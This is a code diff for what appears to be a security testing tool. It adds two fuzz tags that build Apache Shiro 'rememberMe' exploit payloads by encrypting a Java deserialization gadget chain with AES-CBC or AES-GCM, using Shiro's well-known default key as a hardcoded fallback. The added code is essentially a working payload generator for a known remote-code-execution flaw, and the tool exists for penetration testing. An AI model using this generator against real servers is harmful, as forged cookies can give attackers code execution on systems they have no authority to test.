@@ -1803,7 +1803,6 @@ func init() {
 			pushNewResult := func(d []byte, verbose []string) {
 				result = append(result, fuzztag.NewFuzzExecResult(d, verbose))
 			}
-
 			if s == "all" {
 				for gadget, className := range yso.GetGadgetChecklist() {
 					javaObj, err := yso.GetFindClassByBombJavaObject(className)
@@ -1906,6 +1905,78 @@ func init() {
 		Description:         "由于回显链需要从多个连接中找到指定连接写入回显信息，所以需要设置一个特定的header",
 		TagNameVerbose:      "header认证",
 		ArgumentDescription: "",
+	})
+	AddFuzzTagToGlobal(&FuzzTagDescription{
+		TagName: "shiro:cbc",
+		ErrorInfoHandler: func(s string) ([]string, error) {
+			var (
+				key       = "kPH+bIxk5D2deZiIxcaaaA=="
+				shiroByte string
+			)
+
+			params := strings.Split(s, ",")
+			if len(params) == 2 {
+				key = params[0]
+				shiroByte = params[1]
+			} else {
+				shiroByte = s
+			}
+			bytes, err := codec.DecodeBase64(key)
+			if err != nil {
+				return nil, err
+			}
+			decodeBase64, err := codec.DecodeBase64(shiroByte)
+			if err != nil {
+				return nil, err
+			}
+			iv := utils.RandStringBytes(16)
+			paddingPayload := codec.PKCS5Padding(decodeBase64, 16)
+			encrypt, err := codec.AESCBCEncrypt(bytes, paddingPayload, []byte(iv))
+			if err != nil {
+				return nil, err
+			}
+			encodeBase64 := codec.EncodeBase64(append([]byte(iv), encrypt...))
+			return []string{encodeBase64}, nil
+		},
+		Description:         "生成shiro-aes类型的payload",
+		TagNameVerbose:      "shiro-aes",
+		ArgumentDescription: "{{string(key:密钥)}}{{string(payload:利用链)}}",
+	})
+	AddFuzzTagToGlobal(&FuzzTagDescription{
+		TagName: "shiro:gcm",
+		ErrorInfoHandler: func(s string) ([]string, error) {
+			var (
+				key       = "kPH+bIxk5D2deZiIxcaaaA=="
+				shiroByte string
+			)
+
+			params := strings.Split(s, ",")
+			if len(params) == 2 {
+				key = params[0]
+				shiroByte = params[1]
+			} else {
+				shiroByte = s
+			}
+			bytes, err := codec.DecodeBase64(key)
+			if err != nil {
+				return nil, err
+			}
+			decodeBase64, err := codec.DecodeBase64(shiroByte)
+			if err != nil {
+				return nil, err
+			}
+			iv := utils.RandBytes(16)
+			paddingPayload := codec.PKCS5Padding(decodeBase64, 16)
+			encrypt, err := codec.AESGCMEncrypt(bytes, paddingPayload, iv)
+			if err != nil {
+				return nil, err
+			}
+			encodeBase64 := codec.EncodeBase64(append(iv, encrypt...))
+			return []string{encodeBase64}, nil
+		},
+		Description:         "生成shiro-gcm类型的payload",
+		TagNameVerbose:      "shiro-gcm",
+		ArgumentDescription: "{{string(key:密钥)}}{{string(payload:利用链)}}",
 	})
 }
 
